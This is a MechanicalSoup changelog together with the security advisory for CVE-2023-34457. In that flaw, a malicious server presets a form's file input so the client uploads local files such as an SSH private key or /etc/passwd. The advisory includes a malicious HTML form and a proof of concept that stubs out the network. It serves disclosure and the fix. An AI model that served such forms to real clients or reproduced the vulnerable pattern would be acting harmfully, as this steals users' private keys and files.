## Breaking changes

* To prevent malicious web servers from reading arbitrary files from the client, files must now be opened explicitly by the user in order to upload their contents in form submission. For example, instead of:

  ```
  browser["upload"] = "/path/to/file"
  ```

  you would now use:

  ```
  browser["upload"] = open("/path/to/file", "rb")
  ```

  This remediates [CVE-2023-34457](https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4). Our thanks to [@e-c-d](https://github.com/e-c-d) for reporting and helping to fix the vulnerability!

## Main changes

* Added support for Python 3.11.
* Allow submitting a form with no submit element. This can be achieved by passing `submit=False` to `StatefulBrowser.submit_selected`. Thanks [@alexreg](https://github.com/alexreg)! [[#480](https://github.com/MechanicalSoup/MechanicalSoup/pull/411)]

* tests: Add separate test to check for [CVE-2023-34457](https://github.com/advisories/GHSA-x456-3ccm-m6j4 "CVE-2023-34457").

* Revert "tests: Add separate test to check for [CVE-2023-34457](https://github.com/advisories/GHSA-x456-3ccm-m6j4 "CVE-2023-34457")."

This reverts commit bd4c6d92a8a803499a447b511bc46b1ba00841d0.

* Misc cleanup

* No need to raise the error on forms with an enctype that do not
  upload files (e.g. everything besides multipart).

* Make sure that open file inputs are converted to their basename
  regardless of what kind of form it is to avoid leaking local file
  paths.

* Throw error at time when the file input is set incorrectly, rather
  than at submission time.

* Factor complex repeated logic into their own functions (i.e. for
  the multipart file input check and invalid file value check).

* Fix failing tests.

* Avoid excessive whitespace in exception message.

* Reorder 'and' operands so the slightly less expensive check comes first.

# Malicious web server can read arbitrary files on client using file input inside HTML form

## Package

pip

MechanicalSoup
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<=1.2.0, >=0.2.0

## Patched versions

>=1.3.0

## Description

### Summary

A malicious web server can read arbitrary files on the client using a `<input type="file" ...>` inside HTML form.

### Details

This affects the extremely common pattern of form submission:

```
b = mechanicalsoup.StatefulBrowser()
b.select_form(...)
b.submit_selected()
```

The problem is with the code in `browser.Browser.get_request_kwargs`:

```
    if tag.get("type", "").lower() == "file" and multipart:
        filepath = value
        if filepath != "" and isinstance(filepath, str):
            content = open(filepath, "rb")
        else:
            content = ""
        filename = os.path.basename(filepath)
        # If value is the empty string, we still pass it
        # for consistency with browsers (see
        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
        files[name] = (filename, content)
```

The file path is taken from the bs4 tag "value" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:

```
<html><body>
  <form method="post" enctype="multipart/form-data">
    <input type="text" name="greeting" value="hello" />
    <input type="file" name="evil" value="/home/user/.ssh/id_rsa" />
  </form>
</body></html>
```

then upon `.submit_selected()` the mechanicalsoup browser will happily send over the contents of your SSH private key.

### PoC

```
import attr
import mechanicalsoup
import requests

class NevermindError(Exception):
    pass

@attr.s
class FakeSession:
    session = attr.ib()

    headers = property(lambda self: self.session.headers)

    def request(self, *args, **kwargs):
        print("requested", args, kwargs)
        raise NevermindError  # don't actually send request

def demonstrate(inputs=None):
    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))
    b.open_fake_page("""\
<html><body>
<form method="post" enctype="multipart/form-data">
<input type="text" name="greeting" value="hello" />
<input type="file" name="evil" value="/etc/passwd" />
<input type="file" name="second" />
</form>
</body></html>
""", url="http://127.0.0.1:9/")
    b.select_form()
    if inputs is not None:
        b.form.set_input(inputs)
    try:
        b.submit_selected()
    except NevermindError:
        pass

# %%

# unpatched
demonstrate()
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', <_io.BufferedReader name='/etc/passwd'>), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}

# %%

# with the patch, this now works. users MUST open the file manually and
# use browser.set_input() using the file object.
demonstrate({"greeting": "hiya", "evil": open("/etc/hostname", "rb").name, "second": open("/dev/null", "rb")})
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', <_io.BufferedReader name='/etc/hostname'>), 'second': ('null', <_io.BufferedReader name='/dev/null'>)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}

# %%

# with the patch, this raises a ValueError with a helpful string
demonstrate({"evil": "/etc/hostname"})

# %%

# with the patch, we silently send no file if a malicious server tries the attack:
demonstrate()

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
